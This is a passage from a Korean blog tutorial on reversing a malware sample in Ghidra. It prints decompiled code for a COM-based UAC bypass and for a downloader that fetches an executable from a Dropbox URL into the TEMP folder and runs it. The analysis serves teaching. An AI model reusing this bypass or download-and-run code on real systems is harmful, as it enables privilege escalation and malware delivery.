살펴봅시다.</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">FUN_0040f860</span><span class="hljs-params">(undefined *param_1,<span class="hljs-keyword">int</span> param_2)</span></span><span class="hljs-function"></span><span class="hljs-function"></span>&#123;  undefined *puVar1;    puVar1 = param_1 + param_2;  <span class="hljs-keyword">if</span> (param_2 != <span class="hljs-number">0</span>) &#123;    <span class="hljs-keyword">do</span> &#123;      *param_1 = <span class="hljs-number">0</span>;      param_1 = param_1 + <span class="hljs-number">1</span>;    &#125; <span class="hljs-keyword">while</span> (puVar1 != param_1);  &#125;  <span class="hljs-keyword">return</span>;&#125;</code></pre><p>포인터를 받아서 <code>param2</code>만큼 0으로 초기화합니다. 해당 함수는 <code>RtlSecureMemory()</code>와 매우 흡사하죠.</p><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> __CRT__NO_INLINE 1</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;windows.h&gt;</span></span><span class="hljs-function">PVOID WINAPI <span class="hljs-title">RtlSecureZeroMemory</span><span class="hljs-params">(PVOID ptr,SIZE_T cnt)</span></span><span class="hljs-function"></span>&#123;  <span class="hljs-keyword">volatile</span> <span class="hljs-keyword">char</span> *vptr = (<span class="hljs-keyword">volatile</span> <span class="hljs-keyword">char</span> *)ptr;<span class="hljs-meta">#<span class="hljs-meta-keyword">ifdef</span> __x86_64</span>  __stosb ((PBYTE)((DWORD64)vptr),<span class="hljs-number">0</span>,cnt);<span class="hljs-meta">#<span class="hljs-meta-keyword">else</span></span>  <span class="hljs-keyword">while</span> (cnt != <span class="hljs-number">0</span>)    &#123;      *vptr++ = <span class="hljs-number">0</span>;      cnt--;    &#125;<span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span> <span class="hljs-comment">/* __x86_64 */</span></span>  <span class="hljs-keyword">return</span> ptr;</code></pre><p>출처 : <a href="https://github.com/Alexpux/mingw-w64/blob/master/mingw-w64-crt/intrincs/RtlSecureZeroMemory.c">https://github.com/Alexpux/mingw-w64/blob/master/mingw-w64-crt/intrincs/RtlSecureZeroMemory.c</a></p><p>해당 함수의 이름을 <code>RtlSecureMemory</code>로 하고 Function Signature를 수정하도록 하겠습니다. 함수 이름에 커서를 올린 후 우클릭 - Edit Function Signature를 클릭하여 위의 소스 코드에 나온 Signature와 동일하게 수정해줍니다. </p><p><img src="/2021/05/19/idioth/ghidra_part4/Untitled%209.png"></p><p>그리고 OK를 클릭하면</p><pre><code class="hljs c"><span class="hljs-function">PVOID <span class="hljs-title">RtlSecureMemory</span><span class="hljs-params">(PVOID param_1,SIZE_T param_2)</span></span><span class="hljs-function"></span><span class="hljs-function"></span>&#123;  undefined *puVar1;    puVar1 = (undefined *)((<span class="hljs-keyword">int</span>)param_1 + param_2);  <span class="hljs-keyword">if</span> (param_2 != <span class="hljs-number">0</span>) &#123;    <span class="hljs-keyword">do</span> &#123;      *(undefined *)param_1 = <span class="hljs-number">0</span>;      param_1 = (PVOID)((<span class="hljs-keyword">int</span>)param_1 + <span class="hljs-number">1</span>);    &#125; <span class="hljs-keyword">while</span> (puVar1 != (undefined *)param_1);  &#125;  <span class="hljs-keyword">return</span>;&#125;</code></pre><p>깔끔하게(?) 바뀐 것을 확인할 수 있습니다.</p><p><img src="/2021/05/19/idioth/ghidra_part4/Untitled%2010.png"></p><p>하하하 괜찮습니다. 그럼 이제 다음 함수인 <code>FUN_00401a0f</code>가 어떠한 동작을 하는지 확인해봅시다.</p><p><img src="/2021/05/19/idioth/ghidra_part4/Untitled%2011.png"></p><p>앞부분을 읽어보니 인터넷에 연결을 해서 해당 URL에서 ATAPIConfiguration을 다운로드하는 함수임을 짐작할 수 있습니다. 일단 함수명을 <code>download_ATAPIConfiguration</code>이라고 합시다. 이 함수의 전체적인 동작 기능을 정리해보면</p><ol><li><a href="https://gist.github.com/api0cradle/d4aaef39db0d845627d819b2b6b30512">COM 인터페이스를 사용하여 UAC를 우회</a></li><li>인터넷에서 ATAPIConfiguration을 다운로드</li></ol><p>그럼 해당 함수 이름은 uac_bypass_and_download_file로 하여 정리를 하면 다음과 같은 코드가 됩니다.</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">uac_bypass_download_file</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><span class="hljs-function"></span><span class="hljs-function"></span>&#123;  HMODULE HModule;  HRESULT HVar1;  <span class="hljs-keyword">wchar_t</span> <span class="hljs-built_in">string</span> [<span class="hljs-number">260</span>];  BIND_OPTS pBindOptions;  undefined4 local_60;  <span class="hljs-keyword">int</span> *ppv;  CLSID local_4c;  IID riid;  CoGetObject *CoGetObject_addr;  IIDFromString *IIDFromString_addr;  CLSIDFromString *CLSIDFromString_addr;  HRESULT local_20;  CoInitializeEx *CoInitializeEx_addr;  HMODULE hModule;  <span class="hljs-keyword">int</span> local_14;  HRESULT local_10;    local_10 = <span class="hljs-number">0x80004005</span>;  local_14 = <span class="hljs-number">0</span>;  ppv = (<span class="hljs-keyword">int</span> *)<span class="hljs-number">0x0</span>;  hModule = LoadLibraryA(<span class="hljs-string">&quot;ole32.dll&quot;</span>);  CoInitializeEx_addr = (CoInitializeEx *)GetProcAddress(hModule,<span class="hljs-string">&quot;CoInitializeEx&quot;</span>);  local_20 = (*CoInitializeEx_addr)((LPVOID)<span class="hljs-number">0x0</span>,<span class="hljs-number">6</span>);  HModule = GetModuleHandleW(<span class="hljs-string">L&quot;Ole32.dll&quot;</span>);  CLSIDFromString_addr = (CLSIDFromString *)GetProcAddress(HModule,<span class="hljs-string">&quot;CLSIDFromString&quot;</span>);  HModule = GetModuleHandleW(<span class="hljs-string">L&quot;Ole32.dll&quot;</span>);  IIDFromString_addr = (IIDFromString *)GetProcAddress(HModule,<span class="hljs-string">&quot;IIDFromString&quot;</span>);  <span class="hljs-keyword">do</span> &#123;    HVar1 = (*CLSIDFromString_addr)(<span class="hljs-string">L&quot;&#123;3E5FC7F9-9A51-4367-9063-A120244FBEC7&#125;&quot;</span>,(LPCLSID)&amp;local_4c);    <span class="hljs-keyword">if</span> ((HVar1 != <span class="hljs-number">0</span>) ||       (HVar1 = (*IIDFromString_addr)(<span class="hljs-string">L&quot;&#123;6EDD6D74-C007-4E75-B76A-E5740995E24C&#125;&quot;</span>,(LPIID)&amp;riid),       HVar1 != <span class="hljs-number">0</span>)) <span class="hljs-keyword">break</span>;    RtlSecureZeroMemory(<span class="hljs-built_in">string</span>,<span class="hljs-number">0x208</span>);    wcscpy(<span class="hljs-built_in">string</span>,<span class="hljs-string">L&quot;Elevation:Administrator!new:&quot;</span>);    wcscat(<span class="hljs-built_in">string</span>,<span class="hljs-string">L&quot;&#123;3E5FC7F9-9A51-4367-9063-A120244FBEC7&#125;&quot;</span>);    RtlSecureZeroMemory(&amp;pBindOptions,<span class="hljs-number">0x24</span>);    pBindOptions.cbStruct = <span class="hljs-number">0x24</span>;    local_60 = <span class="hljs-number">4</span>;    HModule = GetModuleHandleW(<span class="hljs-string">L&quot;Ole32.dll&quot;</span>);    CoGetObject_addr = (CoGetObject *)GetProcAddress(HModule,<span class="hljs-string">&quot;CoGetObject&quot;</span>);    local_10 = (*CoGetObject_addr)(<span class="hljs-built_in">string</span>,&amp;pBindOptions,&amp;riid,&amp;ppv);    download_ATAPIConfiguration();    local_10 = (**(code **)(*ppv + <span class="hljs-number">0x24</span>))(ppv,download_path,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">5</span>);  &#125; <span class="hljs-keyword">while</span> (local_14 != <span class="hljs-number">0</span>);  <span class="hljs-keyword">if</span> (ppv != (<span class="hljs-keyword">int</span> *)<span class="hljs-number">0x0</span>) &#123;    (**(code **)(*ppv + <span class="hljs-number">8</span>))(ppv);  &#125;  <span class="hljs-keyword">return</span>;&#125;</code></pre><h2 id="ATAPIConfiguration-다운로드-함수"><a href="#ATAPIConfiguration-다운로드-함수" class="headerlink" title="ATAPIConfiguration 다운로드 함수"></a>ATAPIConfiguration 다운로드 함수</h2><p>이제 아까 지나쳤던 <code>download_ATAPIConfiguration()</code>을 분석을 해봅시다.</p><pre><code class="hljs c"><span class="hljs-function">undefined4 <span class="hljs-title">download_ATAPIConfiguration</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><span class="hljs-function"></span><span class="hljs-function"></span>&#123;  <span class="hljs-keyword">char</span> cVar1;  <span class="hljs-keyword">bool</span> bVar2;  undefined4 uVar3;  HMODULE pHVar4;  <span class="hljs-keyword">int</span> iVar5;  <span class="hljs-keyword">size_t</span> sVar6;  undefined4 *puVar7;  uint uVar8;  LPCSTR pCVar9;  <span class="hljs-keyword">int</span> local_64;  undefined4 local_60;  undefined4 local_5c;  uint local_58;  FARPROC local_54;  FARPROC local_50;  FARPROC local_4c;  HANDLE local_48;  FARPROC local_44;  <span class="hljs-keyword">char</span> *local_40;  <span class="hljs-keyword">void</span> *local_3c;  <span class="hljs-keyword">int</span> local_38;  FARPROC local_34;  FARPROC local_30;  FARPROC local_2c;  <span class="hljs-keyword">int</span> local_28;  FARPROC local_24;  <span class="hljs-keyword">int</span> local_20;  FARPROC local_1c;  <span class="hljs-keyword">int</span> local_18;  FARPROC local_14;  HMODULE local_10;    local_10 = LoadLibraryA(<span class="hljs-string">&quot;wininet.dll&quot;</span>);  local_14 = GetProcAddress(local_10,<span class="hljs-string">&quot;InternetOpenW&quot;</span>);  local_18 = (*local_14)(<span class="hljs-string">L&quot;WINDOWS&quot;</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);  <span class="hljs-keyword">if</span> (local_18 == <span class="hljs-number">0</span>) &#123;    uVar3 = <span class="hljs-number">0xe</span>;  &#125;  <span class="hljs-keyword">else</span> &#123;    pHVar4 = GetModuleHandleW(<span class="hljs-string">L&quot;wininet.dll&quot;</span>);    local_1c = GetProcAddress(pHVar4,<span class="hljs-string">&quot;InternetConnectW&quot;</span>);    local_20 = (*local_1c)(local_18,<span class="hljs-string">L&quot;dl.dropboxusercontent.com&quot;</span>,<span class="hljs-number">0x1bb</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">3</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>);    <span class="hljs-keyword">if</span> (local_20 == <span class="hljs-number">0</span>) &#123;      uVar3 = <span class="hljs-number">0xe</span>;    &#125;    <span class="hljs-keyword">else</span> &#123;      pHVar4 = GetModuleHandleW(<span class="hljs-string">L&quot;wininet.dll&quot;</span>);      local_24 = GetProcAddress(pHVar4,<span class="hljs-string">&quot;HttpOpenRequestW&quot;</span>);      local_28 = (*local_24)(local_20,&amp;DAT_00413270,<span class="hljs-string">L&quot;/s/uzu60whrg1spnyy/ATAPIConfiguration&quot;</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,                             <span class="hljs-number">0x800000</span>,<span class="hljs-number">1</span>);      <span class="hljs-keyword">if</span> (local_28 == <span class="hljs-number">0</span>) &#123;        uVar3 = <span class="hljs-number">0xe</span>;      &#125;      <span class="hljs-keyword">else</span> &#123;        local_5c = <span class="hljs-number">4</span>;        pHVar4 = GetModuleHandleW(<span class="hljs-string">L&quot;wininet.dll&quot;</span>);        local_2c = GetProcAddress(pHVar4,<span class="hljs-string">&quot;InternetQueryOptionW&quot;</span>);        iVar5 = (*local_2c)(local_28,<span class="hljs-number">0x1f</span>,&amp;local_58,&amp;local_5c);        <span class="hljs-keyword">if</span> (iVar5 != <span class="hljs-number">0</span>) &#123;          pHVar4 = GetModuleHandleW(<span class="hljs-string">L&quot;wininet.dll&quot;</span>);          local_30 = GetProcAddress(pHVar4,<span class="hljs-string">&quot;InternetSetOptionW&quot;</span>);          local_58 = local_58 | <span class="hljs-number">0x1180</span>;          (*local_30)(local_28,<span class="hljs-number">0x1f</span>,&amp;local_58,<span class="hljs-number">4</span>);        &#125;        pHVar4 = GetModuleHandleW(<span class="hljs-string">L&quot;wininet.dll&quot;</span>);        local_34 = GetProcAddress(pHVar4,<span class="hljs-string">&quot;HttpSendRequestA&quot;</span>);        local_38 = (*local_34)(local_28,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);        local_3c = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">16000</span>);        <span class="hljs-built_in">memset</span>(local_3c,<span class="hljs-number">0</span>,<span class="hljs-number">16000</span>);        <span class="hljs-built_in">memset</span>(DAT_00416028,<span class="hljs-number">0</span>,<span class="hljs-number">0x1000</span>);        local_40 = getenv(<span class="hljs-string">&quot;TEMP&quot;</span>);        sVar6 = <span class="hljs-built_in">strlen</span>(local_40);        DAT_0041602c = (LPCSTR)<span class="hljs-built_in">malloc</span>(sVar6 + <span class="hljs-number">0x1000</span>);        <span class="hljs-built_in">strcpy</span>(DAT_0041602c,local_40);        uVar8 = <span class="hljs-number">0xffffffff</span>;        pCVar9 = DAT_0041602c;        <span class="hljs-keyword">do</span> &#123;          <span class="hljs-keyword">if</span> (uVar8 == <span class="hljs-number">0</span>) <span class="hljs-keyword">break</span>;          uVar8 = uVar8 - <span class="hljs-number">1</span>;          cVar1 = *pCVar9;          pCVar9 = pCVar9 + <span class="hljs-number">1</span>;        &#125; <span class="hljs-keyword">while</span> (cVar1 != <span class="hljs-string">&#x27;\0&#x27;</span>);        puVar7 = (undefined4 *)(DAT_0041602c + (~uVar8 - <span class="hljs-number">1</span>));        *puVar7 = <span class="hljs-number">0x4154415c</span>;        puVar7[<span class="hljs-number">1</span>] = <span class="hljs-number">0x6f434950</span>;        puVar7[<span class="hljs-number">2</span>] = <span class="hljs-number">0x6769666e</span>;        puVar7[<span class="hljs-number">3</span>] = <span class="hljs-number">0x74617275</span>;        puVar7[<span class="hljs-number">4</span>] = <span class="hljs-number">0x2e6e6f69</span>;        puVar7[<span class="hljs-number">5</span>] = <span class="hljs-number">0x657865</span>;        MultiByteToWideChar(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,DAT_0041602c,<span class="hljs-number">-1</span>,DAT_00416028,<span class="hljs-number">0x1000</span>);        pHVar4 = GetModuleHandleW(<span class="hljs-string">L&quot;kernel32.dll&quot;</span>);        local_44 = GetProcAddress(pHVar4,<span class="hljs-string">&quot;CreateFileW&quot;</span>);        local_48 = (HANDLE)(*local_44)(DAT_00416028,<span class="hljs-number">0xc0000000</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0x80</span>,<span class="hljs-number">0</span>);        local_60 = <span class="hljs-number">0</span>;        pHVar4 = GetModuleHandleW(<span class="hljs-string">L&quot;wininet.dll&quot;</span>);        local_4c = GetProcAddress(pHVar4,<span class="hljs-string">&quot;InternetReadFile&quot;</span>);        pHVar4 = GetModuleHandleW(<span class="hljs-string">L&quot;kernel32.dll&quot;</span>);        local_50 = GetProcAddress(pHVar4,<span class="hljs-string">&quot;WriteFile&quot;</span>);        <span class="hljs-keyword">if</span> (local_38 == <span class="hljs-number">0</span>) &#123;          uVar3 = <span class="hljs-number">0xe</span>;        &#125;        <span class="hljs-keyword">else</span> &#123;          local_64 = <span class="hljs-number">0</span>;          <span class="hljs-keyword">while</span>( <span class="hljs-literal">true</span> ) &#123;            iVar5 = (*local_4c)(local_28,local_3c,<span class="hljs-number">0x2000</span>,&amp;local_64);            <span class="hljs-keyword">if</span> ((iVar5 == <span class="hljs-number">0</span>) || (local_64 == <span class="hljs-number">0</span>)) &#123;              bVar2 = <span class="hljs-literal">false</span>;            &#125;            <span class="hljs-keyword">else</span> &#123;              bVar2 = <span class="hljs-literal">true</span>;            &#125;            <span class="hljs-keyword">if</span> (!bVar2) <span class="hljs-keyword">break</span>;            (*local_50)(local_48,local_3c,local_64,&amp;local_60,<span class="hljs-number">0</span>);          &#125;          pHVar4 = GetModuleHandleW(<span class="hljs-string">L&quot;wininet.dll&quot;</span>);          local_54 = GetProcAddress(pHVar4,<span class="hljs-string">&quot;InternetCloseHandle&quot;</span>);          CloseHandle(local_48);          (*local_54)(local_18);          (*local_54)(local_20);          (*local_54)(local_28);          uVar3 = <span class="hljs-number">1</span>;        &#125;      &#125;    &#125;  &#125;  <span class="hljs-keyword">return</span> uVar3;&#125;</code></pre><p>이 친구도 상당히 지저분하네요. 정리가 필요할 듯합니다. 아까 사용한 방법처럼 먼저 Handle과 함수 포인터들을 정리해줍시다!</p><p><img src="/2021/05/19/idioth/ghidra_part4/Untitled%2012.png"></p><p>하지만… <code>InternetOpenW</code>의 데이터 타입이 없다고 나옵니다. 흠… 뭐가 문제일까? Data Type Manager에서 찾아봅시다. <code>InternetOpenW()</code>는 <code>wininet.h</code>에 존재하는 함수이니 <code>wininet.h</code>가 있는지 확인을 해볼까요?</p><p><img src="/2021/05/19/idioth/ghidra_part4/Untitled%2013.png"></p><p>없네요… 그럼 기능을 사용하지 못하는 걸까요? MSDN을 보고 손수 작성을 해야 하는 건가? 직접 헤더 파일을 추가해야 하는 건가? 직접 헤더 파일을 추가하는 방법도 있지만, 이런 WinAPI들의 아카이브 파일을 누군가 github에 올려놓았습니다!</p><p>저는 Visual Studio Community를 다운로드해서 해당 헤더 파일을 직접 추가하고자 하였으나 어떤 이유에서인지… 각종 reference를 찾아서 똑같이 해도 추가가 안되더라고요… 똑같은 행위를 반복하며 엔터를 계속 누르며 분노 게이지가 차고 있었습니다.</p><p><img src="/2021/05/19/idioth/ghidra_part4/Untitled%2014.png"></p><p>그러던 와중 아래의 github repo는 저에게 큰 도움이 되었죠!</p><p><a href="https://github.com/0x6d696368/ghidra-data/tree/master/typeinfo">https://github.com/0x6d696368/ghidra-data/tree/master/typeinfo</a></p><p>해당 프로그램은 32비트 바이너리이므로 <code>winapi_32.gdt</code> 파일을 다운로드합니다.</p><p><img src="/2021/05/19/idioth/ghidra_part4/Untitled%2015.png"></p><p><img src="/2021/05/19/idioth/ghidra_part4/Untitled%2016.png"></p><p>그 후 Data Type Manager의 우측 상단에 아래쪽 화살표 모양을 클릭한 후 Open File Archive를 클릭합니다.</p><p><img src="/2021/05/19/idioth/ghidra_part4/Untitled%2017.png"></p><p>그다음 다운로드한 gdt 파일을 열어주면 끝!</p><p><img src="/2021/05/19/idioth/ghidra_part4/Untitled%2018.png"></p><p>이제 추가가 되어 있는 모습을 확인할 수 있습니다… 후후 다른 함수 포인터들도 모두 적용하도록 하죠. 적용이 완료된 소스 코드는 다음과 같습니다.</p><pre><code class="hljs c"><span class="hljs-function">undefined4 <span class="hljs-title">download_ATAPIConfiguration</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><span class="hljs-function"></span><span class="hljs-function"></span>&#123;  <span class="hljs-keyword">char</span> cVar1;  <span class="hljs-keyword">bool</span> bVar2;  undefined4 uVar3;  HMODULE hModule;  <span class="hljs-keyword">int</span> iVar4;  <span class="hljs-keyword">size_t</span> temp_path_len;  undefined4 *puVar5;  uint uVar6;  LPCSTR pCVar7;  <span class="hljs-keyword">int</span> local_64;  undefined4 local_60;  undefined4 lpdwBufferLength;  uint lpBuffer;  FARPROC InternetCloseHandle_addr;  FARPROC WriteFile_addr;  FARPROC InternetReadFile_addr;  HANDLE local_48;  FARPROC CreateFileW_addr;  <span class="hljs-keyword">char</span> *temp_path;  <span class="hljs-keyword">void</span> *local_3c;  <span class="hljs-keyword">int</span> local_38;  FARPROC HttpSendRequestA_addr;  FARPROC InternetSetOptionW;  FARPROC InternetQueryOptionW_addr;  <span class="hljs-keyword">int</span> hInternet;  FARPROC HttpOpenRequestW_addr;  <span class="hljs-keyword">int</span> hConnect;  FARPROC InternetConnectW_addr;  <span class="hljs-keyword">int</span> local_18;  FARPROC InternetOpenW_addr;  HMODULE local_10;    local_10 = LoadLibraryA(<span class="hljs-string">&quot;wininet.dll&quot;</span>);  InternetOpenW_addr = GetProcAddress(local_10,<span class="hljs-string">&quot;InternetOpenW&quot;</span>);  local_18 = (*InternetOpenW_addr)(<span class="hljs-string">L&quot;WINDOWS&quot;</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);  <span class="hljs-keyword">if</span> (local_18 == <span class="hljs-number">0</span>) &#123;    uVar3 = <span class="hljs-number">0xe</span>;  &#125;  <span class="hljs-keyword">else</span> &#123;    hModule = GetModuleHandleW(<span class="hljs-string">L&quot;wininet.dll&quot;</span>);    InternetConnectW_addr = GetProcAddress(hModule,<span class="hljs-string">&quot;InternetConnectW&quot;</span>);    hConnect = (*InternetConnectW_addr)(local_18,<span class="hljs-string">L&quot;dl.dropboxusercontent.com&quot;</span>,<span class="hljs-number">0x1bb</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">3</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>);    <span class="hljs-keyword">if</span> (hConnect == <span class="hljs-number">0</span>) &#123;      uVar3 = <span class="hljs-number">0xe</span>;    &#125;    <span class="hljs-keyword">else</span> &#123;      hModule = GetModuleHandleW(<span class="hljs-string">L&quot;wininet.dll&quot;</span>);      HttpOpenRequestW_addr = GetProcAddress(hModule,<span class="hljs-string">&quot;HttpOpenRequestW&quot;</span>);      hInternet = (*HttpOpenRequestW_addr)                            (hConnect,&amp;DAT_00413270,<span class="hljs-string">L&quot;/s/uzu60whrg1spnyy/ATAPIConfiguration&quot;</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,                             <span class="hljs-number">0x800000</span>,<span class="hljs-number">1</span>);      <span class="hljs-keyword">if</span> (hInternet == <span class="hljs-number">0</span>) &#123;        uVar3 = <span class="hljs-number">0xe</span>;      &#125;      <span class="hljs-keyword">else</span> &#123;        lpdwBufferLength = <span class="hljs-number">4</span>;        hModule = GetModuleHandleW(<span class="hljs-string">L&quot;wininet.dll&quot;</span>);        InternetQueryOptionW_addr = GetProcAddress(hModule,<span class="hljs-string">&quot;InternetQueryOptionW&quot;</span>);        iVar4 = (*InternetQueryOptionW_addr)(hInternet,<span class="hljs-number">0x1f</span>,&amp;lpBuffer,&amp;lpdwBufferLength);        <span class="hljs-keyword">if</span> (iVar4 != <span class="hljs-number">0</span>) &#123;          hModule = GetModuleHandleW(<span class="hljs-string">L&quot;wininet.dll&quot;</span>);          InternetSetOptionW = GetProcAddress(hModule,<span class="hljs-string">&quot;InternetSetOptionW&quot;</span>);          lpBuffer = lpBuffer | <span class="hljs-number">0x1180</span>;          (*InternetSetOptionW)(hInternet,<span class="hljs-number">0x1f</span>,&amp;lpBuffer,<span class="hljs-number">4</span>);        &#125;        hModule = GetModuleHandleW(<span class="hljs-string">L&quot;wininet.dll&quot;</span>);        HttpSendRequestA_addr = GetProcAddress(hModule,<span class="hljs-string">&quot;HttpSendRequestA&quot;</span>);        local_38 = (*HttpSendRequestA_addr)(hInternet,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>);        local_3c = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">16000</span>);        <span class="hljs-built_in">memset</span>(local_3c,<span class="hljs-number">0</span>,<span class="hljs-number">16000</span>);        <span class="hljs-built_in">memset</span>(download_path,<span class="hljs-number">0</span>,<span class="hljs-number">0x1000</span>);        temp_path = getenv(<span class="hljs-string">&quot;TEMP&quot;</span>);        temp_path_len = <span class="hljs-built_in">strlen</span>(temp_path);        DAT_0041602c = (LPCSTR)<span class="hljs-built_in">malloc</span>(temp_path_len + <span class="hljs-number">0x1000</span>);        <span class="hljs-built_in">strcpy</span>(DAT_0041602c,temp_path);        uVar6 = <span class="hljs-number">0xffffffff</span>;        pCVar7 = DAT_0041602c;        <span class="hljs-keyword">do</span> &#123;          <span class="hljs-keyword">if</span> (uVar6 == <span class="hljs-number">0</span>) <span class="hljs-keyword">break</span>;          uVar6 = uVar6 - <span class="hljs-number">1</span>;          cVar1 = *pCVar7;          pCVar7 = pCVar7 + <span class="hljs-number">1</span>;        &#125; <span class="hljs-keyword">while</span> (cVar1 != <span class="hljs-string">&#x27;\0&#x27;</span>);        puVar5 = (undefined4 *)(DAT_0041602c + (~uVar6 - <span class="hljs-number">1</span>));        *puVar5 = <span class="hljs-number">0x4154415c</span>;        puVar5[<span class="hljs-number">1</span>] = <span class="hljs-number">0x6f434950</span>;        puVar5[<span class="hljs-number">2</span>] = <span class="hljs-number">0x6769666e</span>;        puVar5[<span class="hljs-number">3</span>] = <span class="hljs-number">0x74617275</span>;        puVar5[<span class="hljs-number">4</span>] = <span class="hljs-number">0x2e6e6f69</span>;        puVar5[<span class="hljs-number">5</span>] = <span class="hljs-number">0x657865</span>;        MultiByteToWideChar(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,DAT_0041602c,<span class="hljs-number">-1</span>,download_path,<span class="hljs-number">0x1000</span>);        hModule = GetModuleHandleW(<span class="hljs-string">L&quot;kernel32.dll&quot;</span>);        CreateFileW_addr = GetProcAddress(hModule,<span class="hljs-string">&quot;CreateFileW&quot;</span>);                    <span class="hljs-comment">/* GENERIC_READ | GENERIC_WRITE */</span>        local_48 = (HANDLE)(*CreateFileW_addr)(download_path,<span class="hljs-number">0xc0000000</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0x80</span>,<span class="hljs-number">0</span>);        local_60 = <span class="hljs-number">0</span>;        hModule = GetModuleHandleW(<span class="hljs-string">L&quot;wininet.dll&quot;</span>);        InternetReadFile_addr = GetProcAddress(hModule,<span class="hljs-string">&quot;InternetReadFile&quot;</span>);        hModule = GetModuleHandleW(<span class="hljs-string">L&quot;kernel32.dll&quot;</span>);        WriteFile_addr = GetProcAddress(hModule,<span class="hljs-string">&quot;WriteFile&quot;</span>);        <span class="hljs-keyword">if</span> (local_38 == <span class="hljs-number">0</span>) &#123;          uVar3 = <span class="hljs-number">0xe</span>;        &#125;        <span class="hljs-keyword">else</span> &#123;          local_64 = <span class="hljs-number">0</span>;          <span class="hljs-keyword">while</span>( <span class="hljs-literal">true</span> ) &#123;            iVar4 = (*InternetReadFile_addr)(hInternet,local_3c,<span class="hljs-number">0x2000</span>,&amp;local_64);            <span class="hljs-keyword">if</span> ((iVar4 == <span class="hljs-number">0</span>) || (local_64 == <span class="hljs-number">0</span>)) &#123;              bVar2 = <span class="hljs-literal">false</span>;            &#125;            <span class="hljs-keyword">else</span> &#123;              bVar2 = <span class="hljs-literal">true</span>;            &#125;            <span class="hljs-keyword">if</span> (!bVar2) <span class="hljs-keyword">break</span>;            (*WriteFile_addr)(local_48,local_3c,local_64,&amp;local_60,<span class="hljs-number">0</span>);          &#125;          hModule = GetModuleHandleW(<span class="hljs-string">L&quot;wininet.dll&quot;</span>);          InternetCloseHandle_addr = GetProcAddress(hModule,<span class="hljs-string">&quot;InternetCloseHandle&quot;</span>);          CloseHandle(local_48);          (*InternetCloseHandle_addr)(local_18);          (*InternetCloseHandle_addr)(hConnect);          (*InternetCloseHandle_addr)(hInternet);          uVar3 = <span class="hljs-number">1</span>;        &#125;      &#125;    &#125;  &#125;  <span class="hljs-keyword">return</span> uVar3;&#125;</code></pre><p>함수가 많이 기네요… 위에서부터 내려가 봅시다.</p><p><img src="/2021/05/19/idioth/ghidra_part4/Untitled%2019.png"></p><p><code>HttpOpenRequestW</code>를 통해 <code>dl.dropboxusercontent.com/s/uzu60whrglspnyy/ATAPIConfiguration</code>에 연결합니다.</p><p><img src="/2021/05/19/idioth/ghidra_part4/Untitled%2020.png"></p><p>TEMP 폴더의 경로를 가져와 다운로드할 경로를 설정하는 것 같습니다. 근데 hex로 되어 있어서 확인하기 어렵네요. 디스 어셈블 창에서 Conver → Char Sequence로 어떤 문자열인지 확인해봅시다.</p><p><img src="/2021/05/19/idioth/ghidra_part4/Untitled%2021.png"></p><p><code>\\ATAPIConfiguration.exe\0</code>네요. 이제 경로 설정까지 했으니 파일을 읽어와 해당 경로에 생성하겠죠?</p><p><img src="/2021/05/19/idioth/ghidra_part4/Untitled%2022.png"></p><p>빙고입니다. 정리하면 <code>download_ATAPIConfiguration()</code>은 <code>dl.dropboxusercontent.com/s/uzu60whrglspnyy/ATAPIConfiguration</code>에 접속해서 <code>%TEMP%\ATAPIConfiguration.exe</code>로 파일을 다운로드한다!</p><h1 id="to-be-continued…"><a href="#to-be-continued…" class="headerlink" title="to be continued…"></a>to be continued…</h1><p>다음에는 ATAPIConfiguration에 대해서 다뤄볼 예정입니다. 원래 한 글에 모두 다 담으려 했는데 생각보다 많이 길어졌네요. 다른 분석은 모두 제외하고 ghidra를 사용한 정적 분석만 진행하는 것이라 틀린 내용이 존재할 수도 있습니다! 그럼 최대한 빨리 다음 파트를 준비해오도록 하겠습니다. 그럼 모두 안녕~</p>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>idioth</tag>
      
      <tag>malware</tag>
      
      <tag>reversing</tag>
      
      <tag>ghidra</tag>
      
      <tag>ransomware</tag>
      
      <tag>ghidra tutorials</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-22204: ExifTool 임의 코드 실행 취약점</title>
    <link href="/2021/05/18/l0ch/2021-05-18/"/>
    <url>/2021/05/18/l0ch/2021-05-18/</url>
    
